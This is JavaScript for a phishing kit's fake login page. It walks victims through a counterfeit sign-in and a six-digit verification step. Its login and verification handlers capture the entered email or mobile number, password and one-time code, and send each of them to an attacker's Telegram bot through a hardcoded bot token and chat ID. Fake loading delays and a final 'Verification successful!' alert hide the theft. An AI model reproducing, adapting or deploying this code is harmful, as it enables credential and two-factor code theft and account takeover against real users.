// Handle login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading on login button
            const loginBtn = document.getElementById('loginBtn');
            const loginBtnText = document.getElementById('loginBtnText');
            const loginLoading = document.getElementById('loginLoading');
            
            loginBtn.disabled = true;
            loginBtnText.textContent = 'Logging in...';
            loginLoading.style.display = 'inline-block';
            
            // Get form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send to Telegram
            sendToTelegram(`Login attempt:\nEmail/Mobile: ${email}\nPassword: ${password}`);
            
            // Store phone number for verification page
            const phone = email.includes('@') ? email.split('@')[0] : email;
            sessionStorage.setItem('phone', phone);
            
            // Simulate API call delay
            setTimeout(function() {
                // Show verification method selection page
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('verificationMethodPage').style.display = 'flex';
                
                // Reset login button
                loginBtn.disabled = false;
                loginBtnText.textContent = 'Log in';
                loginLoading.style.display = 'none';
            }, 1500);
        });
        
        // Continue to verification page
        document.getElementById('continueVerificationBtn').addEventListener('click', function() {
            const phone = sessionStorage.getItem('phone');
            
            // Show loading on continue button
            const continueBtn = document.getElementById('continueVerificationBtn');
            const continueBtnText = document.getElementById('continueBtnText');
            const continueLoading = document.getElementById('continueLoading');
            
            continueBtn.disabled = true;
            continueBtnText.textContent = 'Processing...';
            continueLoading.style.display = 'inline-block';
            
            // Update phone number display
            document.getElementById('phoneNumber').textContent = phone.replace(/(.{3})/g, '$1-');
            
            // Simulate processing delay
            setTimeout(function() {
                // Show loading page
                document.getElementById('verificationMethodPage').style.display = 'none';
                document.getElementById('loadingPage').style.display = 'flex';
                
                // Reset continue button
                continueBtn.disabled = false;
                continueBtnText.textContent = 'Continue';
                continueLoading.style.display = 'none';
                
                // After 3 seconds, show verification page
                setTimeout(function() {
                    document.getElementById('loadingPage').style.display = 'none';
                    document.getElementById('verificationPage').style.display = 'flex';
                    
                    // Focus on first verification input
                    setTimeout(() => {
                        document.getElementById('code1').focus();
                    }, 100);
                }, 3000);
            }, 1000);
        });
        
        // Back to login page
        document.getElementById('backToLoginBtn').addEventListener('click', function() {
            document.getElementById('verificationMethodPage').style.display = 'none';
            document.getElementById('loginPage').style.display = 'flex';
        });
        
        // Back to method selection
        document.getElementById('backToMethodBtn').addEventListener('click', function() {
            document.getElementById('verificationPage').style.display = 'none';
            document.getElementById('verificationMethodPage').style.display = 'flex';
        });
        
        // Handle verification form submission
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading on verify button
            const verifyBtn = document.getElementById('verifyBtn');
            const verifyBtnText = document.getElementById('verifyBtnText');
            const verifyLoading = document.getElementById('verifyLoading');
            
            verifyBtn.disabled = true;
            verifyBtnText.textContent = 'Verifying...';
            verifyLoading.style.display = 'inline-block';
            
            // Get verification code
            const code = document.getElementById('code1').value +
                         document.getElementById('code2').value +
                         document.getElementById('code3').value +
                         document.getElementById('code4').value +
                         document.getElementById('code5').value +
                         document.getElementById('code6').value;
            
            // Send to Telegram
            sendToTelegram(`Verification code entered via phone: ${code}`);
            
            // Simulate verification delay
            setTimeout(function() {
                // Simulate successful verification
                alert('Verification successful! You would normally be logged in now.');
                
                // Reset verify button
                verifyBtn.disabled = false;
                verifyBtnText.textContent = 'Verify';
                verifyLoading.style.display = 'none';
            }, 2000);
        });
        
        // Telegram bot integration
        function sendToTelegram(message) {
            const token = '7760116585:AAHFAvaewiHFA_rwBRKQIxGhyPnyDy4eQzQ';
            const chatId = '8195351488';
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            // Send data to Telegram
            fetch(url).catch(err => console.error('Telegram error:', err));
        }
        
        // Move focus to next input
        for (let i = 1; i <= 6; i++) {
            document.getElementById(`code${i}`).addEventListener('input', function() {
                if (this.value.length === 1 && i < 6) {
                    document.getElementById(`code${i+1}`).focus();
                }
            });
            
            // Allow backspace navigation
            document.getElementById(`code${i}`).addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && i > 1) {
                    document.getElementById(`code${i-1}`).focus();
                }
            });
        }
        
        // Language selector functionality
        document.getElementById('languageSelect').addEventListener('change', function() {
            alert('Language changed to: ' + this.options[this.selectedIndex].text);
        });